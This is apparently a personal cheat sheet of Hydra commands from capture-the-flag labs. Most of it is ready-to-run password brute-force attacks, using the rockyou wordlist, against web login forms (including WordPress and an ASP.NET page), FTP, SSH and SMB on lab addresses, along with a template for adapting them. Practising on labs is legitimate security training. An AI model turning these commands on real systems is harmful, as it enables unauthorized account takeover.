# Hydra Usage

## PREREQUISITES
```
[url] https://github.com/vanhauser-thc/thc-hydra/issues/344
sudo apt install libssl-dev libssh-dev libidn11-dev libpcre3-dev libgtk2.0-dev libmysqlclient-dev libpq-dev libsvn-dev firebird-dev libmemcached-dev libgpg-error-dev libgcrypt11-dev libgcrypt20-dev
./configure
make clean
./configure && make
sudo make install
```

## HTTP-GET
```
hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.71.162 http-get /protected
```

## HTTP-POST-FORM
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.2.149 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=By8urVFpnlfexD8DyDdPbWLSqOirobunFsxJ7Cd774KtrS2bwAKZNC0XmeXiD3uHFWySx2Q6fR4sbjFFgvX9pQd8U5BNhZRE4HY5NdKc%2B7gxQC8WS84Pq68UmyQtveAtMINYZLc15cTRo2SeoDNmIP5417bTgDB2Y1Q5I2GEl4ARM50bRnKG3EiI2fgC%2BzAmYyNm4%2F8N85RWr6pAweaZIXmRw6gf9J3S%2B519ZukpAZP1f33uGBfRfBQTtBSOVfWhlRZwRpHMOLoDeO%2B3UKcKKvtOw6jg0oyyfuEMGdo0v0aE78zlEZjq%2BOQmaOBCVHXj9l%2FXlb%2FaYerOt81aZOtJut24903sxBBiR8beLzPnR87TrB2L&__EVENTVALIDATION=0DGJLgb7A1FGp%2BlL47uDCydxq34yyQ%2BJf3n9rdYod0NexQySghd%2Bvf9u%2FDPM4ODXa9hj5Q17mycnybBWOkeFStnJEH05%2BRlaE%2BNQM7g6taNSByAJx%2FiwKWiu8OoOl1FkdYSq1QuFXe3re1lbm%2BCFuTYNxDm3%2B3hQrPpBBbPNS0Ll%2BJd1&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.72.80 http-post-form "/administrator/index.php:username=^USER^&passwd=^PASS^&option=com_login&task=login:do not match:-H=Cookie: eaa83fe8b963ab08ce9ab7d4a798de05=2ofh1h4551ubfv27hfvcaotlv7; 2b01af51830ca9615359108de04d9ca1=sp2vtofi5k1togl4nhhph5n3v5"

hydra -l <username> -P <password list> <ip address> http-post-form <"/path/to/form">:__VIEWSTATE:<error message>
Also be sure to change out the username to ^USER^ and password to ^PASS^

hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.252.105 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect"
```

## HTTP-POST-FORM Brutefore Usernames
```
hydra -L sorted.dic -p pass 10.10.187.171 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username" -t 35
```

## HTTP-POST Brutecforce Passwords
```
hydra -l elliot -P sorted.dic 10.10.187.171 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username" -t 35
```

## FTP
```
hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.173.92 ftp
```

## SSH
```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.252.105 -t 4 ssh
```

## SMB
```
hydra -l jon -P /usr/share/wordlists/rockyou.txt 10.10.95.216 smb -t 40
```
